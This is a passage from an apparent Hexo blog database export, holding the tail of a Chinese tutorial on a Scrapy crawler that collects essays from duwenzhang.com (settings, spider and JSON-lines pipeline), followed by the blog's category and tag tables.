CONCURRENT_REQUESTS = 32\n\n# Configure a delay for requests for the same website (default: 0)\n# See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n# See also autothrottle settings and docs\nDOWNLOAD_DELAY = 1\n# The download delay setting will honor only one of:\n# CONCURRENT_REQUESTS_PER_DOMAIN = 16\n# CONCURRENT_REQUESTS_PER_IP = 16\n\n# Disable cookies (enabled by default)\n# COOKIES_ENABLED = False\n\n# Disable Telnet Console (enabled by default)\n# TELNETCONSOLE_ENABLED = False\n\n# Override the default request headers:\nDEFAULT_REQUEST_HEADERS = &#123;\n    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,\n    &#39;Accept-Language&#39;: &#39;en&#39;,\n    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#39;\n                  &#39;Chrome/80.0.3987.163 Safari/537.36 &#39;\n&#125;\n\n# Enable or disable spider middlewares\n# See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n# SPIDER_MIDDLEWARES = &#123;\n#    &#39;prose.middlewares.ProseSpiderMiddleware&#39;: 543,\n# &#125;\n\n# Enable or disable downloader middlewares\n# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n# DOWNLOADER_MIDDLEWARES = &#123;\n#    &#39;prose.middlewares.ProseDownloaderMiddleware&#39;: 543,\n# &#125;\n\n# Enable or disable extensions\n# See https://doc.scrapy.org/en/latest/topics/extensions.html\n# EXTENSIONS = &#123;\n#    &#39;scrapy.extensions.telnet.TelnetConsole&#39;: None,\n# &#125;\n\n# Configure item pipelines\n# See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\nITEM_PIPELINES = &#123;\n   &#39;prose.pipelines.ProsePipeline&#39;: 300,\n&#125;\n\n# Enable and configure the AutoThrottle extension (disabled by default)\n# See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n# AUTOTHROTTLE_ENABLED = True\n# The initial download delay\n# AUTOTHROTTLE_START_DELAY = 5\n# The maximum download delay to be set in case of high latencies\n# AUTOTHROTTLE_MAX_DELAY = 60\n# The average number of requests Scrapy should be sending in parallel to\n# each remote server\n# AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n# Enable showing throttling stats for every response received:\n# AUTOTHROTTLE_DEBUG = False\n\n# Enable and configure HTTP caching (disabled by default)\n# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n# HTTPCACHE_ENABLED = True\n# HTTPCACHE_EXPIRATION_SECS = 0\n# HTTPCACHE_DIR = &#39;httpcache&#39;\n# HTTPCACHE_IGNORE_HTTP_CODES = []\n# HTTPCACHE_STORAGE = &#39;scrapy.extensions.httpcache.FilesystemCacheStorage&#39;\n</code></pre>\n<ul>\n<li>proseSpider部分</li>\n</ul>\n<pre><code class=\"python\"># -*- coding: utf-8 -*-\nimport scrapy\nfrom prose.items import ProseItem\n\n\nclass ProsespiderSpider(scrapy.Spider):\n    name = &#39;proseSpider&#39;\n    allowed_domains = [&#39;duwenzhang.com&#39;]\n    start_urls = [&#39;http://www.duwenzhang.com/wenzhang/shenghuosuibi/&#39;]\n    base_url = &#39;http://www.duwenzhang.com/wenzhang/shenghuosuibi/&#39;\n\n    def parse(self, response):\n        # xpath 选择不含有某一属性的标签\n        url_list = response.xpath(&#39;//center//tr[2]//td[(@valign) and not(@height)]/table&#39;)\n        for it in url_list:\n            title = it.xpath(&#39;.//tr[2]//td[@height=&quot;26&quot;]/b/a/text()&#39;).getall()\n            text = it.xpath(&#39;.//tr[4]/td[@style=&quot;padding-left:3px&quot;]/text()&#39;).getall()\n            text = &quot;&quot;.join(text).strip()\n            item = ProseItem(title=title, text=text)\n            yield item\n        # //a[contains(text(), &quot;百度搜索&quot;)]  【可以部分检索】\n        # //a[text()=&quot;文字内容&quot;] 【需要填全】 xpath定位指定文本标签\n        next_url = response.xpath(&#39;//tr//a[text()=&quot;下一页&quot;]/@href&#39;).get()\n        if not next_url:\n            return\n        else:\n            yield scrapy.Request(self.base_url+next_url, callback=self.parse)\n\n</code></pre>\n<ul>\n<li>piplines 部分</li>\n</ul>\n<pre><code class=\"python\"># -*- coding: utf-8 -*-\n\n# Define your item pipelines here\n#\n# Don&#39;t forget to add your pipeline to the ITEM_PIPELINES setting\n# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n\nimport json\nfrom scrapy.exporters import JsonLinesItemExporter\n\n\nclass ProsePipeline(object):\n    def __init__(self):\n        self.fp = open(&#39;prose.json&#39;, &#39;wb&#39;)\n        self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False,\n                                              encoding=&#39;utf-8&#39;)\n\n    def open_spider(self, spider):\n        print(&#39;爬虫开始了...&#39;)\n\n    def process_item(self, item, spider):\n        self.exporter.export_item(item)\n        return item\n\n    def close_spider(self, spider):\n        self.fp.close()\n        print(&#39;爬虫结束了....&#39;)</code></pre>"}],"PostAsset":[],"PostCategory":[{"post_id":"ckq3bl41p0001dsvtfjmq6tgm","category_id":"ckq3bl41v0004dsvt3xh38x3p","_id":"ckq3bl424000gdsvtcqliemcn"},{"post_id":"ckq3bl41t0003dsvtaj3heby2","category_id":"ckq3bl421000bdsvt5iow770y","_id":"ckq3bl42g000mdsvtcoh3g9lq"},{"post_id":"ckq3bl41x0007dsvt60mz5ck4","category_id":"ckq3bl424000hdsvt7x236d8n","_id":"ckq3bl42i000sdsvtfi365wlv"},{"post_id":"ckq3bl41z0009dsvt7nd466qn","category_id":"ckq3bl42g000odsvt605lewxo","_id":"ckq3bl42m0010dsvtg8g8hywi"},{"post_id":"ckq3bl420000adsvt32sd8uav","category_id":"ckq3bl42g000odsvt605lewxo","_id":"ckq3bl42o0014dsvtcwn42ssv"},{"post_id":"ckq3bl422000edsvtevykb2zd","category_id":"ckq3bl42m000zdsvt7uqfc97v","_id":"ckq3bl42s001bdsvt5njpb5dl"},{"post_id":"ckq3bl426000jdsvtgqihhikn","category_id":"ckq3bl42p0017dsvt4ptrhk5z","_id":"ckq3bl42v001fdsvt4ginag71"},{"post_id":"ckq3bl42h000pdsvt0fozbxy7","category_id":"ckq3bl42s001ddsvt9cij410b","_id":"ckq3bl42w001jdsvtf9f47jks"},{"post_id":"ckq3bl42k000xdsvtfz947uul","category_id":"ckq3bl42w001hdsvtd2m3fsan","_id":"ckq3bl42x001ndsvtaq9fcdl4"},{"post_id":"ckq3bl42m0011dsvtbi13h47i","category_id":"ckq3bl42x001ldsvt6psc3t5c","_id":"ckq3bl42y001rdsvt93owb6mx"},{"post_id":"ckq3bl42o0016dsvtb56w83nw","category_id":"ckq3bl42y001pdsvt8xjphl2e","_id":"ckq3bl430001vdsvtfjj27vgo"},{"post_id":"ckq3bl42p0019dsvtcgwf0em8","category_id":"ckq3bl42w001hdsvtd2m3fsan","_id":"ckq3bl43b001xdsvt39dg256t"},{"post_id":"ckq3bl42r001adsvt3bxafbd9","category_id":"ckq3bl42z001udsvtbhhi0jtp","_id":"ckq3bl43c0021dsvt2sl55vue"},{"post_id":"ckq3bl43r0026dsvt92jm62zj","category_id":"ckq3bl42y001pdsvt8xjphl2e","_id":"ckq3bl43s0029dsvt6oxaceyw"},{"post_id":"ckq3bl43w002bdsvt71k69usk","category_id":"ckq3bl43w002cdsvt2r1ohhbm","_id":"ckq3bl440002idsvt45fw21v0"},{"post_id":"ckq3bl43w002bdsvt71k69usk","category_id":"ckq3bl43x002fdsvt2awj7jkp","_id":"ckq3bl440002jdsvt3gqu0aif"}],"PostTag":[{"post_id":"ckq3bl41p0001dsvtfjmq6tgm","tag_id":"ckq3bl41w0005dsvtcrlg2yeq","_id":"ckq3bl422000ddsvt1ytr10f1"},{"post_id":"ckq3bl41t0003dsvtaj3heby2","tag_id":"ckq3bl421000cdsvt428y169c","_id":"ckq3bl428000kdsvt3x77edx5"},{"post_id":"ckq3bl41x0007dsvt60mz5ck4","tag_id":"ckq3bl421000cdsvt428y169c","_id":"ckq3bl42h000qdsvt8uvuf5uk"},{"post_id":"ckq3bl41z0009dsvt7nd466qn","tag_id":"ckq3bl42g000ndsvtfbvj48xo","_id":"ckq3bl42k000wdsvt4cx033xw"},{"post_id":"ckq3bl420000adsvt32sd8uav","tag_id":"ckq3bl42g000ndsvtfbvj48xo","_id":"ckq3bl42n0012dsvtbe981wny"},{"post_id":"ckq3bl422000edsvtevykb2zd","tag_id":"ckq3bl42l000ydsvt0oyg79sl","_id":"ckq3bl42p0018dsvt5kxehmf0"},{"post_id":"ckq3bl426000jdsvtgqihhikn","tag_id":"ckq3bl42o0015dsvtc6w5gc77","_id":"ckq3bl42v001edsvt38x0e3om"},{"post_id":"ckq3bl42h000pdsvt0fozbxy7","tag_id":"ckq3bl42s001cdsvtcfsggesy","_id":"ckq3bl42w001idsvt1fe236z6"},{"post_id":"ckq3bl42k000xdsvtfz947uul","tag_id":"ckq3bl42v001gdsvtd4y5hb1i","_id":"ckq3bl42x001mdsvt674nejqf"},{"post_id":"ckq3bl42m0011dsvtbi13h47i","tag_id":"ckq3bl42w001kdsvt3xi957ih","_id":"ckq3bl42y001qdsvtefbs3cg2"},{"post_id":"ckq3bl42o0016dsvtb56w83nw","tag_id":"ckq3bl42x001odsvt3kpf5lwp","_id":"ckq3bl43c001zdsvt6ivz7izd"},{"post_id":"ckq3bl42o0016dsvtb56w83nw","tag_id":"ckq3bl42y001sdsvt6xlj8fvz","_id":"ckq3bl43c0020dsvtcebt4o02"},{"post_id":"ckq3bl42o0016dsvtb56w83nw","tag_id":"ckq3bl430001wdsvt2g5c1zro","_id":"ckq3bl43c0023dsvtfjqf4laq"},{"post_id":"ckq3bl42p0019dsvtcgwf0em8","tag_id":"ckq3bl43b001ydsvt2ywbha9n","_id":"ckq3bl43c0024dsvtbjxl8k0w"},{"post_id":"ckq3bl42r001adsvt3bxafbd9","tag_id":"ckq3bl43c0022dsvt6n8p7c2z","_id":"ckq3bl43d0025dsvtadp59gq5"},{"post_id":"ckq3bl43r0026dsvt92jm62zj","tag_id":"ckq3bl42x001odsvt3kpf5lwp","_id":"ckq3bl43s0027dsvtgy3car1m"},{"post_id":"ckq3bl43r0026dsvt92jm62zj","tag_id":"ckq3bl42y001sdsvt6xlj8fvz","_id":"ckq3bl43s0028dsvt8bv5dr89"},{"post_id":"ckq3bl43r0026dsvt92jm62zj","tag_id":"ckq3bl430001wdsvt2g5c1zro","_id":"ckq3bl43s002adsvtecz0403k"},{"post_id":"ckq3bl43w002bdsvt71k69usk","tag_id":"ckq3bl43x002ddsvtb8yhbjfs","_id":"ckq3bl440002gdsvt6skz3vbi"},{"post_id":"ckq3bl43w002bdsvt71k69usk","tag_id":"ckq3bl43x002edsvt1d848ivk","_id":"ckq3bl440002hdsvt3jfd4mgc"}],"Tag":[{"name":"Git","_id":"ckq3bl41w0005dsvtcrlg2yeq"},{"name":"Linux","_id":"ckq3bl421000cdsvt428y169c"},{"name":"Markdown","_id":"ckq3bl42g000ndsvtfbvj48xo"},{"name":"HTML","_id":"ckq3bl42l000ydsvt0oyg79sl"},{"name":"hexo","_id":"ckq3bl42o0015dsvtc6w5gc77"},{"name":"网络编程","_id":"ckq3bl42s001cdsvtcfsggesy"},{"name":"网络","_id":"ckq3bl42v001gdsvtd4y5hb1i"},{"name":"blog","_id":"ckq3bl42w001kdsvt3xi957ih"},{"name":"Mysql","_id":"ckq3bl42x001odsvt3kpf5lwp"},{"name":"SQL","_id":"ckq3bl42y001sdsvt6xlj8fvz"},{"name":"数据库","_id":"ckq3bl430001wdsvt2g5c1zro"},{"name":"黑客技术","_id":"ckq3bl43b001ydsvt2ywbha9n"},{"name":"网络协议","_id":"ckq3bl43c0022dsvt6n8p7c2z"},{"name":"爬虫","_id":"ckq3bl43x002ddsvtb8yhbjfs"},{"name":"python","_id":"ckq3bl43x002edsvt1d848ivk"}]}}